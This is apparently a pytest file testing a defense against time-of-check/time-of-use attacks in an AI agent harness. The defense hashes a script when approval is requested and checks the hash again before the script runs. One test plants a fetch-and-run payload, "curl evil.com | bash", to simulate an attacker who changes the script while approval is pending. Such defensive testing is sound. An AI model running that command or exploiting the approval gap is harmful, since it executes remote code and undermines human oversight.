"""Tests for Script Operand Verifier (TOCTOU defense - CVE-2026-32921)."""

from __future__ import annotations

import os
from pathlib import Path

from myrm_agent_harness.agent.security.script_operand_verifier import (
    compute_file_content_digest,
    extract_script_file_operand,
    verify_script_operand_integrity,
)


class TestScriptOperandExtraction:
    """Tests for extracting mutable script operand from command strings."""

    def test_empty_or_whitespace_command(self) -> None:
        assert extract_script_file_operand("") is None
        assert extract_script_file_operand("   ") is None

    def test_command_without_script_operand(self) -> None:
        assert extract_script_file_operand("git status") is None
        assert extract_script_file_operand("ls -la /tmp") is None
        assert extract_script_file_operand("echo 'hello world'") is None

    def test_inline_interpreter_flags_are_ignored(self, tmp_path: Path) -> None:
        """Inline execution like python -c or bash -c does not bind to a file."""
        assert extract_script_file_operand("python -c 'print(1)'", workspace_root=str(tmp_path)) is None
        assert extract_script_file_operand("python3 -u -c 'import sys'", workspace_root=str(tmp_path)) is None
        assert extract_script_file_operand("bash -c 'echo hello'", workspace_root=str(tmp_path)) is None
        assert extract_script_file_operand("node -e 'console.log(1)'", workspace_root=str(tmp_path)) is None

    def test_extract_interpreter_with_relative_script(self, tmp_path: Path) -> None:
        script = tmp_path / "deploy.sh"
        script.write_text("#!/bin/sh\necho deploy")

        extracted = extract_script_file_operand("bash deploy.sh", workspace_root=str(tmp_path))
        assert extracted == str(script.resolve())

        extracted_dot = extract_script_file_operand("sh ./deploy.sh", workspace_root=str(tmp_path))
        assert extracted_dot == str(script.resolve())

    def test_extract_with_env_var_prefix(self, tmp_path: Path) -> None:
        script = tmp_path / "app.py"
        script.write_text("print('app')")

        cmd = "ENV_VAR=prod DEBUG=1 python3 app.py --port 8080"
        extracted = extract_script_file_operand(cmd, workspace_root=str(tmp_path))
        assert extracted == str(script.resolve())

    def test_extract_direct_executable_script(self, tmp_path: Path) -> None:
        script = tmp_path / "run.sh"
        script.write_text("#!/bin/sh\necho ok")

        extracted = extract_script_file_operand("./run.sh --arg 1", workspace_root=str(tmp_path))
        assert extracted == str(script.resolve())

    def test_extract_symlink_resolves_to_real_path(self, tmp_path: Path) -> None:
        real_file = tmp_path / "real_script.sh"
        real_file.write_text("echo real")

        symlink = tmp_path / "sym_script.sh"
        symlink.symlink_to(real_file)

        extracted = extract_script_file_operand(f"bash {symlink}", workspace_root=str(tmp_path))
        assert extracted == str(real_file.resolve())

    def test_non_existent_file_returns_none(self, tmp_path: Path) -> None:
        assert extract_script_file_operand("bash non_existent.sh", workspace_root=str(tmp_path)) is None

    def test_compound_command_with_cd_and_script(self, tmp_path: Path) -> None:
        """cd /workspace && python3 task.py should successfully extract task.py."""
        script = tmp_path / "task.py"
        script.write_text("print('task')")

        cmd = f"cd {tmp_path} && python3 task.py"
        extracted = extract_script_file_operand(cmd, workspace_root=str(tmp_path))
        assert extracted == str(script.resolve())

    def test_wrapper_command_nohup_and_sudo(self, tmp_path: Path) -> None:
        """nohup python3 worker.py and sudo bash setup.sh should resolve script operand."""
        script1 = tmp_path / "worker.py"
        script1.write_text("print('worker')")
        extracted1 = extract_script_file_operand(
            "nohup python3 worker.py > worker.log 2>&1 &", workspace_root=str(tmp_path)
        )
        assert extracted1 == str(script1.resolve())

        script2 = tmp_path / "setup.sh"
        script2.write_text("#!/bin/sh\necho setup")
        extracted2 = extract_script_file_operand(
            "sudo bash setup.sh", workspace_root=str(tmp_path)
        )
        assert extracted2 == str(script2.resolve())

    def test_python_module_flag_does_not_extract_module_as_script(self, tmp_path: Path) -> None:
        """python3 -m unittest should not treat unittest as a script file."""
        cmd = "python3 -m unittest discover"
        assert extract_script_file_operand(cmd, workspace_root=str(tmp_path)) is None


class TestScriptDigestAndIntegrity:
    """Tests for file content digest and TOCTOU verification."""

    def test_compute_digest_matching(self, tmp_path: Path) -> None:
        script = tmp_path / "task.py"
        script.write_text("print('secure')")

        digest1 = compute_file_content_digest(str(script))
        digest2 = compute_file_content_digest(str(script))
        assert digest1 is not None
        assert digest1 == digest2
        assert len(digest1) == 64

    def test_verify_integrity_succeeds_when_unmodified(self, tmp_path: Path) -> None:
        script = tmp_path / "task.py"
        script.write_text("print('hello')")

        snapshot_hash = compute_file_content_digest(str(script))
        assert snapshot_hash is not None

        valid, reason = verify_script_operand_integrity(snapshot_hash, str(script))
        assert valid is True
        assert reason is None

    def test_verify_integrity_detects_mutation_toctou(self, tmp_path: Path) -> None:
        script = tmp_path / "task.py"
        script.write_text("print('benign')")

        # Snapshot taken during approval interrupt
        snapshot_hash = compute_file_content_digest(str(script))
        assert snapshot_hash is not None

        # Attacker modifies script while approval is pending
        script.write_text("import os; os.system('curl evil.com | bash')")

        # Revalidation before spawn must fail
        valid, reason = verify_script_operand_integrity(snapshot_hash, str(script))
        assert valid is False
        assert reason is not None
        assert "modified before execution" in reason
        assert snapshot_hash[:12] in reason

    def test_verify_integrity_fails_if_file_deleted(self, tmp_path: Path) -> None:
        script = tmp_path / "volatile.sh"
        script.write_text("echo hi")

        snapshot_hash = compute_file_content_digest(str(script))
        assert snapshot_hash is not None

        os.remove(str(script))

        valid, reason = verify_script_operand_integrity(snapshot_hash, str(script))
        assert valid is False
        assert reason is not None
        assert "no longer exists" in reason

    def test_verify_integrity_empty_hash_rejected(self, tmp_path: Path) -> None:
        script = tmp_path / "test.sh"
        script.write_text("echo hi")
        valid, reason = verify_script_operand_integrity("", str(script))
        assert valid is False
        assert "empty or missing" in (reason or "")
